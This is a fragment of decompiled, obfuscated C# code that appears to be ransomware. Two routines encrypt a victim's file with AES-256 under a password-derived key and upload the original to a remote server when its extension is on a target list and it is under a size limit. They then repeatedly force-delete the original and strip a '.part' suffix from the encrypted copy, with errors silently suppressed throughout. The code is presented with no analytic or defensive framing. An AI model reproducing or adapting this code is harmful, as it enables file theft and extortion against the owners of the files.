			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (uySjNlajuEE == "YES")
					{
						foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
						{
							if (string_0.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
							{
								if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
							{
								try
								{
									MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void KfLhmyplGPYqxR(string string_0, string string_1, byte[] byte_0)
	{
		IzImQwKqnmdl CS_0024_003C_003E8__locals0 = new IzImQwKqnmdl();
		CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz = string_0;
		CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string ghQNYBCsZpGoSQ = CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ;
			FileStream fileStream = new FileStream(ghQNYBCsZpGoSQ, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ.Length > 0)
				{
					FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (uySjNlajuEE == "YES")
					{
						foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
						{
							if (CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
							{
								if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
							{
								try
								{
									MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz);
								break;
							}
							catch
							{
							}
						}
					}).Start();
					if (CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ.EndsWith(".part"))
					{
						File.Move(CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ, CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ.Replace(".part", ""));
					}
					return;
				}
				new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ))
							{
								File.Delete(CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ);
							}
							break;
						}
						catch
						{
						}
					}
				}).Start();
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
